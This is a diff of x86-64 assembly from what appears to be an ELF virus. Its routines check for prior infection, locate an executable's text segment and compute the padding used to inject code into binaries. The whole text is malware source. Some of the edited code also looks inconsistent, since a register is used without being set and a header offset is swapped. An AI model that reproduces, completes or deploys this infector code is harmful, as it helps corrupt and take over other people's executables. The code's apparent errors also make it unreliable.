@@ -2,7 +2,6 @@
 				extern			sc_map_file
 				extern			sc_check_infection
 				extern			sc_test_elf_hdr
-				extern			sc_find_txt_seg
 				extern			sc_write_mem
 
 				default			rel
@@ -200,6 +199,8 @@ sc_set_x_pad:
 				mov				r9,						qword[rdi+0x50]	;*hdrs.txt
 				mov				r10,					qword[r9+0x8]
 				add				r10,					qword[r9+0x20]	;hdrs.txt->p_offset + hdrs.txt->p_filesz
+				mov				r11,					qword[rdi+0xc60]
+				add				r11,					qword[r8+0x20]
 
 				mov				rsi,					qword[rdi+0x30]
 				cmp				qword[rdi+0x38],		rsi
@@ -209,8 +210,7 @@ sc_set_x_pad:
 				jb				.error
 
 				xor				rcx,					rcx
-				mov				rdx,					qword[rdi+0xc60]
-				add				rdx,					qword[r8+0x20]
+				mov				rdx,					r11
  .first_loop:
  				cmp				cx,						word[r8+0x38]
 				je				.init_sec_loop
@@ -225,8 +225,7 @@ sc_set_x_pad:
 				jmp				.first_loop
  .init_sec_loop:
  				xor				rcx,					rcx
-				mov				rdx,					qword[rdi+0xc60]
-				add				rdx,					qword[r8+0x28]
+				mov				rdx,					r11
  .second_loop:
  				cmp				cx,						word[r8+0x40]
 				je				.set_pad
@@ -242,6 +241,45 @@ sc_set_x_pad:
  .set_pad:
  				mov				qword[rdi+0xc68],		1
  .success:
+ 				xor				rax,					rax
+				ret
+ .error:
+ 				mov				rax,					-1
+				ret
+sc_find_txt_seg:
+				mov				rdi,					qword[sc_glob]
+				mov				r9,						qword[rdi+0x48];*hdrs.elf
+
+				xor				rcx,					rcx
+				mov				rsi,					qword[rdi+0xc60]
+				add				rsi,					qword[r8+0x20]
+ .loop:
+ 				cmp				qword[rdi+0x50],		0
+				jne				.check_error
+
+				cmp				rcx,					qword[r9+0x38]
+				je				.check_error
+
+				cmp				dword[rsi],				1
+				jne				.end_loop
+
+				mov				edx,					dword[rsi+0x4]
+				and				edx,					0x1
+				cmp				edx,					1
+				jb				.end_loop
+
+				mov				qword[rdi+0x50],		rsi
+  .end_loop:
+				inc				rcx
+				add				rsi,					56
+				jmp				.loop
+ .check_error:
+ 				cmp				qword[rdi+0x50],		0
+				je				.error
+
+				cmp				rcx,					qword[r9+0x38]
+				je				.error
+ .end:
  				xor				rax,					rax
 				ret
  .error:
